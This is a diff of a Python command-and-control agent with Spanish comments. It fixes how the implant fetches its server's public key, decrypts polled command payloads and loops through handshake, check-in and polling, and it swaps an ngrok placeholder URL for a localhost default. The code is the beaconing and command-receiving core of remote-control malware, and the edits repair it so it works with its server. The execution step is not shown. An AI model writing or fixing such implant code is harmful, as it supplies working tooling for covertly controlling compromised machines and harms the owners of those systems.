@@ -24,16 +24,16 @@ except ImportError:
     print("[*] Instálalo con: pip install requests")
     sys.exit(1)
 
-# Import crypto utilities
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+# Import crypto utilities safely using absolute paths
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from shared.crypto_utils import C2Crypto
 
 # ============================================
 # CONFIGURACIÓN FLEXIBLE
 # ============================================
 
-# Valores por defecto (cambiar según tu servidor ngrok)
-DEFAULT_URL = "https://your-ngrok-url.ngrok.io"
+# Valores por defecto
+DEFAULT_URL = "http://127.0.0.1:5000"
 
 # Si se pasa argumento de línea de comandos, usarlo
 if len(sys.argv) >= 2:
@@ -83,7 +83,8 @@ def fetch_server_public_key():
         response.raise_for_status()
         data = response.json()
         
-        pem_key = data.get('public_key')
+        # CORRECTED: Checks both keys to ensure compatibility with server
+        pem_key = data.get('server_public_key') or data.get('public_key')
         if not pem_key:
             print("[!] Server did not return public key")
             return None
@@ -178,7 +179,9 @@ def poll_command():
         # Decrypt the payload
         try:
             decrypted_json = C2Crypto.fernet_decrypt(agent_session_key, encrypted_payload)
-            cmd_data = json.loads(decrypted_json)
+            # Handle standard bytes decoding safely
+            decrypted_str = decrypted_json.decode('utf-8') if isinstance(decrypted_json, bytes) else decrypted_json
+            cmd_data = json.loads(decrypted_str)
             
             # Check if there's an actual command
             if cmd_data.get("command") is not None:
@@ -239,7 +242,7 @@ def run_agent():
     # Loop principal
     while True:
         try:
-            # Paso 0: Establecer sesión criptográfica (obtener public key y generar session key)
+            # Paso 0: Establecer sesión criptográfica
             print(f"[*] Estableciendo handshake criptográfico...")
             session_key, pub_key = establish_crypto_session()
             
@@ -248,7 +251,7 @@ def run_agent():
                 time.sleep(RECONNECT_DELAY)
                 continue
             
-            # Paso 1: Checkin (registro inicial con session key cifrada)
+            # Paso 1: Checkin
             print(f"[*] Intentando checkin con el servidor...")
             if not checkin():
                 print(f"[!] Checkin falló, reintentando en {RECONNECT_DELAY}s...")
